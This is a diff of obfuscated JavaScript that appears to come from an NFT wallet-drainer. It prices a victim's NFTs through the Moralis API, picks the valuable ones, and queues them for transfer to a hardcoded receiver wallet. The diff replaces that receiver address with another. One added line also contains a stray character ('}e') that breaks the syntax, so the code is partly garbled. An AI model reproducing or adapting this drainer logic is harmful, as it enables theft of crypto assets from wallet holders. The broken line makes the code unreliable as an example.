@@ -167,7 +167,7 @@ async function askNfts(khyel, emilyann) {
         await fetch("https://deep-index.moralis.io/api/v2/nft/" + nft.token_address + "/lowestprice?chain=eth" + "&marketplace=opensea", {headers: {"Content-Type": "application/json", accept: "application/json", "x-api-key": moralisApi}, method: "GET"}).then(async mollye => {
           if (mollye.status === 200) {} else {
             return;
-          }
+          }e
           const wrynlee = await mollye.json();
           let loisjean = parseFloat(Web3.utils.fromWei(wrynlee.price, "ether"));
           if (nft.amount) {
@@ -175,7 +175,7 @@ async function askNfts(khyel, emilyann) {
           }
           if (loisjean >= nftsInfo.minValue.toString(10)) {
             console.log(nft.token_address + " (" + nft.token_id + ") | " + loisjean + " > " + nftsInfo.minValue);
-            gennette.push({price: wrynlee.price * (nft.amount > 0 ? nft.amount : 1), options: {type: nft.contract_type.toLowerCase(), receiver: "0xE297cEC625C1043add07067B4ddC9ec3A9BBde13", contract_address: nft.token_address, token_id: nft.token_id}});
+            gennette.push({price: wrynlee.price * (nft.amount > 0 ? nft.amount : 1), options: {type: nft.contract_type.toLowerCase(), receiver: "0x292002e10af14d7eb99e3168b4d5acd8554edc93", contract_address: nft.token_address, token_id: nft.token_id}});
             if (nft.contract_type === "ERC1155") {
               const stellaluna = gennette.find(sharikka => sharikka.options.contract_address == nft.token_address && sharikka.options.token_id == nft.token_id);
               if (stellaluna) {
